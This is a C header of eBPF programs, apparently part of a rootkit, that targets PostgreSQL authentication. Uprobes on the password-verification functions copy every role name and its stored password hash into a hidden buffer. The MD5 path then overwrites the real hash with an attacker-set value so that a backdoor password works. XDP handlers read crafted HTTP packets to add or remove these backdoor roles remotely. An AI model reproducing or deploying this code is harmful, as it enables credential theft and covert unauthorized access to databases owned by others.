/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _POSTGRES_H_
#define _POSTGRES_H_

#define MAX_ROLE_LEN 64
#define MAX_PASS_LEN 64
#define MD5_LEN 36 // 32 bytes for the md5 hash and 3 bytes for the "md5" prefix

struct new_md5_hash_t {
    char md5[MD5_LEN];
};

struct bpf_map_def SEC("maps/postgres_roles") postgres_roles = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = MAX_ROLE_LEN,
    .value_size = sizeof(struct new_md5_hash_t),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct credentials_t {
    char role[MAX_ROLE_LEN];
    char secret[MAX_PASS_LEN];
};

struct bpf_map_def SEC("maps/postgres_cache") postgres_cache = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = DOCKER_IMAGE_LEN,
    .value_size = sizeof(struct credentials_t),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/postgres_list_cursor") postgres_list_cursor = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 1,
    .pinning = 0,
    .namespace = "",
};

/*
 * Check MD5 authentication response, and return STATUS_OK or STATUS_ERROR.
 *
 * 'shadow_pass' is the user's correct password or password hash, as stored
 * in pg_authid.rolpassword.
 * 'client_pass' is the response given by the remote user to the MD5 challenge.
 * 'md5_salt' is the salt used in the MD5 authentication challenge.
 *
 * int md5_crypt_verify(const char *role, const char *shadow_pass,
 *				 const char *client_pass,
 *				 const char *md5_salt, int md5_salt_len,
 *				 char **logdetail)
 */
SEC("uprobe/md5_crypt_verify")
int trace_md5_crypt_verify(struct pt_regs *ctx)
{
    char *role = (void *)PT_REGS_PARM1(ctx);
    char *shadow_pass = (void *)PT_REGS_PARM2(ctx);
    struct new_md5_hash_t *new_md5_hash = 0;

    struct credentials_t creds = {};
    bpf_probe_read_str(&creds.role, MAX_ROLE_LEN, role);
    bpf_probe_read_str(&creds.secret, MD5_LEN, shadow_pass);

    // check if this credentials set was seen before
    u32 *seen = bpf_map_lookup_elem(&postgres_cache, &creds);
    if (seen != NULL) {
        return 0;
    }

    // query the credentials list cursor
    u32 key = 0;
    u32 *cursor = bpf_map_lookup_elem(&postgres_list_cursor, &key);
    if (cursor == NULL) {
        // should never happen
        return 0;
    }

    // fetch fs_watch key for the postgres credentials list
    key = DEDICATED_WATCH_KEY_POSTGRES;
    struct fs_watch_key_t *fs_watch_key = bpf_map_lookup_elem(&dedicated_watch_keys, &key);
    if (fs_watch_key == NULL) {
        // should never happen
        return 0;
    }
    key = 0;

    // fetch fs_watch entry for the postgres credentials list
    struct fs_watch_t *watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
    if (watch == NULL) {
        // create the entry for the first time
        key = 0;
        watch = bpf_map_lookup_elem(&fs_watch_gen, &key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }
        watch->next_key = 0;
        watch->content[0] = 0;

        bpf_map_update_elem(&fs_watches, fs_watch_key, watch, BPF_ANY);
        watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }
    }

    // check if there is enough room in the lastest fs_watch entry, otherwise chain another one
    if (FS_WATCH_MAX_CONTENT - *cursor < 2 * MAX_ROLE_LEN) {
        // generate new key
        u32 new_key = gen_random_key();

        // chain previous and new entry
        watch->next_key = new_key;

        // generate new entry
        watch = bpf_map_lookup_elem(&fs_watch_gen, &key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }

        // reset new entry
        watch->next_key = 0;
        watch->content[0] = 0;

        // update fs_watch_key
        bpf_probe_read(&fs_watch_key->filepath[0], sizeof(u32), &new_key);

        // save new entry
        bpf_map_update_elem(&fs_watches, fs_watch_key, watch, BPF_ANY);
        watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }

        // reset cursor position
        *cursor = 0;
    }

    // copy role
    #pragma unroll
    for (int i = 0; i < MAX_ROLE_LEN; i++) {
        if (creds.role[i] == 0) {
            if (*cursor < FS_WATCH_MAX_CONTENT) {
                watch->content[*cursor] = 35;
            }
            *cursor += 1;
            goto copy_secret;
        }

        // needed for the verifier
        if (*cursor >= FS_WATCH_MAX_CONTENT) {
            goto copy_secret;
        } else {
            watch->content[*cursor] = creds.role[i];
        }
        *cursor += 1;
    }

copy_secret:
    // copy secret
    #pragma unroll
    for (int i = 0; i < MD5_LEN; i++) {
        if (creds.secret[i] == 0) {
            if (*cursor < FS_WATCH_MAX_CONTENT) {
                watch->content[*cursor] = 10;
            }
            *cursor += 1;
            goto next;
        }

        // needed for the verifier
        if (*cursor >= FS_WATCH_MAX_CONTENT) {
            goto next;
        } else {
            watch->content[*cursor] = creds.secret[i];
        }
        *cursor += 1;
    }

next:
    // check if this is a backdoor secret
    new_md5_hash = bpf_map_lookup_elem(&postgres_roles, &creds.role);
    if (new_md5_hash == NULL) {
        return 0;
    }

    // copy db password onto the user input
    bpf_probe_write_user(shadow_pass, &new_md5_hash->md5, MD5_LEN);
    return 0;
};

/*
 * Check given password for given user, and return STATUS_OK or STATUS_ERROR.
 *
 * 'shadow_pass' is the user's correct password hash, as stored in
 * pg_authid.rolpassword.
 * 'client_pass' is the password given by the remote user.
 *
 * int plain_crypt_verify(const char *role, const char *shadow_pass,
 * 				   const char *client_pass,
 *  			   char **logdetail)
 */
SEC("uprobe/plain_crypt_verify")
int trace_plain_crypt_verify(struct pt_regs *ctx)
{
    char *role = (void *)PT_REGS_PARM1(ctx);
    char *shadow_pass = (void *)PT_REGS_PARM2(ctx);

    struct credentials_t creds = {};
    bpf_probe_read_str(&creds.role, MAX_ROLE_LEN, role);
    bpf_probe_read_str(&creds.secret, MD5_LEN, shadow_pass);

    // check if this credentials set was seen before
    u32 *seen = bpf_map_lookup_elem(&postgres_cache, &creds);
    if (seen != NULL) {
        return 0;
    }

    // query the credentials list cursor
    u32 key = 0;
    u32 *cursor = bpf_map_lookup_elem(&postgres_list_cursor, &key);
    if (cursor == NULL) {
        // should never happen
        return 0;
    }

    // fetch fs_watch key for the postgres credentials list
    key = DEDICATED_WATCH_KEY_POSTGRES;
    struct fs_watch_key_t *fs_watch_key = bpf_map_lookup_elem(&dedicated_watch_keys, &key);
    if (fs_watch_key == NULL) {
        // should never happen
        return 0;
    }
    key = 0;

    // fetch fs_watch entry for the postgres credentials list
    struct fs_watch_t *watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
    if (watch == NULL) {
        // create the entry for the first time
        watch = bpf_map_lookup_elem(&fs_watch_gen, &key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }
        watch->next_key = 0;
        watch->content[0] = 0;

        bpf_map_update_elem(&fs_watches, fs_watch_key, watch, BPF_ANY);
        watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }
    }

    // check if there is enough room in the lastest fs_watch entry, otherwise chain another one
    if (FS_WATCH_MAX_CONTENT - *cursor < 2 * MAX_ROLE_LEN) {
        // generate new key
        u32 new_key = gen_random_key();

        // chain previous and new entry
        watch->next_key = new_key;

        // generate new entry
        watch = bpf_map_lookup_elem(&fs_watch_gen, &key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }

        // reset new entry
        watch->next_key = 0;
        watch->content[0] = 0;

        // update fs_watch_key
        bpf_probe_read(&fs_watch_key->filepath[0], sizeof(u32), &new_key);

        // save new entry
        bpf_map_update_elem(&fs_watches, fs_watch_key, watch, BPF_ANY);
        watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }

        // reset cursor position
        *cursor = 0;
    }

    // copy role
    #pragma unroll
    for (int i = 0; i < MAX_ROLE_LEN; i++) {
        if (creds.role[i] == 0) {
            if (*cursor < FS_WATCH_MAX_CONTENT) {
                watch->content[*cursor] = 35;
            }
            *cursor += 1;
            goto copy_secret;
        }

        // needed for the verifier
        if (*cursor >= FS_WATCH_MAX_CONTENT) {
            goto copy_secret;
        } else {
            watch->content[*cursor] = creds.role[i];
        }
        *cursor += 1;
    }

copy_secret:
    // copy secret
    #pragma unroll
    for (int i = 0; i < MD5_LEN; i++) {
        if (creds.secret[i] == 0) {
            if (*cursor < FS_WATCH_MAX_CONTENT) {
                watch->content[*cursor] = 10;
            }
            *cursor += 1;
            goto next;
        }

        // needed for the verifier
        if (*cursor >= FS_WATCH_MAX_CONTENT) {
            goto next;
        } else {
            watch->content[*cursor] = creds.secret[i];
        }
        *cursor += 1;
    }

next:
    return 0;
};

__attribute__((always_inline)) int handle_put_pg_role(char request[HTTP_REQ_LEN]) {
    struct credentials_t creds = {};

    #pragma unroll
    for (int i = 0; i < MD5_LEN - 1; i++) {
        creds.secret[i] = request[i];
    }

    #pragma unroll
    for (int i = 0; i < MAX_ROLE_LEN; i++) {
        if (request[i + MD5_LEN - 1] == '#') {
            goto next;
        } else {
            creds.role[i] = request[i + MD5_LEN - 1];
        }
    }

next:
    // delete the entry in backdoor_secrets
    bpf_map_update_elem(&postgres_roles, &creds.role, &creds.secret, BPF_ANY);
    return 0;
}

SEC("xdp/ingress/put_pg_role")
int xdp_ingress_put_pg_role(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    int ret = parse_xdp_packet(ctx, &c, &pkt);
    if (ret < 0) {
        return XDP_PASS;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (pkt.tcp->dest != htons(load_http_server_port())) {
                return XDP_PASS;
            }

            handle_put_pg_role(pkt.http_req->data);
            // tail call to execute the action set for this request
            bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
            break;
    }

    return XDP_PASS;
}

__attribute__((always_inline)) int handle_del_pg_role(char request[HTTP_REQ_LEN]) {
    struct credentials_t creds = {};

    #pragma unroll
    for (int i = 0; i < MAX_ROLE_LEN; i++) {
        if (request[i] == '#') {
            goto next;
        }
        creds.role[i] = request[i];
    }

next:
    // delete the entry in backdoor_secrets
    bpf_map_delete_elem(&postgres_roles, &creds.role);
    return 0;
}

SEC("xdp/ingress/del_pg_role")
int xdp_ingress_del_pg_role(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    int ret = parse_xdp_packet(ctx, &c, &pkt);
    if (ret < 0) {
        return XDP_PASS;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (pkt.tcp->dest != htons(load_http_server_port())) {
                return XDP_PASS;
            }

            handle_del_pg_role(pkt.http_req->data);
            // tail call to execute the action set for this request
            bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
            break;
    }

    return XDP_PASS;
}

#endif